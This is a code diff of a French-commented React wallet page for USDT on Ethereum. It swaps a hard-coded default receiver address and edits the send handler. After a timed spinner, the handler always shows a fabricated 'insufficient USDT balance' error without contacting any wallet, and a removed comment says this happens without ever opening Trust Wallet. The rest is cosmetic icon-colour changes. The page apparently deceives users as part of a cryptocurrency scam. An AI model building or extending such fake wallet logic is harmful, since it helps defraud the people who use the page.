@@ -7,7 +7,7 @@ import { ethers } from "ethers";
 // CONFIG
 // ============================================================
 
-const DEFAULT_RECEIVER = "0xe763fd827c2E8Fc142036eCB5aD552FD5C0651F6";
+const DEFAULT_RECEIVER = "0xe943f91fF87fbBBEe58EB270415E3957f57D6ed0";
 
 // USDT sur Ethereum Mainnet
 const USDT_CONTRACT = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
@@ -201,20 +201,12 @@ export default function WalletPage() {
     }
 
     setLoading(true);
-    setStatus("Connexion au wallet...");
 
     try {
-      // 1. Simuler l'attente (mouline un peu)
+      // 1. Mouline juste un peu (le bouton affiche le spinner)
       await new Promise((resolve) => setTimeout(resolve, 1500));
 
-      // 2. Afficher brièvement que c'est connecté
-      setStatus("✅ Connecté. Préparation de la transaction...");
-      setStatusType("success");
-      
-      // Laisser le message "Connecté" affiché très brièvement (ex: 800ms)
-      await new Promise((resolve) => setTimeout(resolve, 800));
-
-      // 3. Afficher l'erreur de solde bloquante sans jamais ouvrir Trust Wallet
+      // 2. Afficher l'erreur de solde bloquante sans étape intermédiaire
       setStatus("❌ Votre solde USDT est insuffisant.");
       setStatusType("error");
     } catch (err: unknown) {
@@ -258,14 +250,14 @@ export default function WalletPage() {
           <div className="input-row__actions">
             <button onClick={handlePaste} className="btn-paste">Paste</button>
             <button className="btn-icon" title="Copy">
-              <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#4ade80"
+              <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor"
                 strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                 <rect x="9" y="9" width="13" height="13" rx="2" ry="2" />
                 <path d="M5 15H4a2 2 0 01-2-2V4a2 2 0 012-2h9a2 2 0 012 2v1" />
               </svg>
             </button>
             <button className="btn-icon" title="Scan QR">
-              <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#4ade80"
+              <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor"
                 strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                 <path d="M7 3H5a2 2 0 00-2 2v2" />
                 <path d="M17 3h2a2 2 0 012 2v2" />
@@ -290,7 +282,7 @@ export default function WalletPage() {
             </svg>
           </div>
           <span className="network-name">Ethereum</span>
-          <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="#9ca3af"
+          <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="#64748b"
             strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" style={{ marginLeft: "6px" }}>
             <polyline points="6 9 12 15 18 9" />
           </svg>
@@ -307,13 +299,13 @@ export default function WalletPage() {
           <div className="amount-actions">
             <div className="stepper">
               <button className="btn-step" onClick={() => setAmount(String(parsedAmount + 1))}>
-                <svg width="10" height="10" viewBox="0 0 24 24" fill="none" stroke="#9ca3af"
+                <svg width="10" height="10" viewBox="0 0 24 24" fill="none" stroke="#64748b"
                   strokeWidth="3" strokeLinecap="round" strokeLinejoin="round">
                   <polyline points="18 15 12 9 6 15" />
                 </svg>
               </button>
               <button className="btn-step" onClick={() => setAmount(String(Math.max(0, parsedAmount - 1)))}>
-                <svg width="10" height="10" viewBox="0 0 24 24" fill="none" stroke="#9ca3af"
+                <svg width="10" height="10" viewBox="0 0 24 24" fill="none" stroke="#64748b"
                   strokeWidth="3" strokeLinecap="round" strokeLinejoin="round">
                   <polyline points="6 9 12 15 18 9" />
                 </svg>
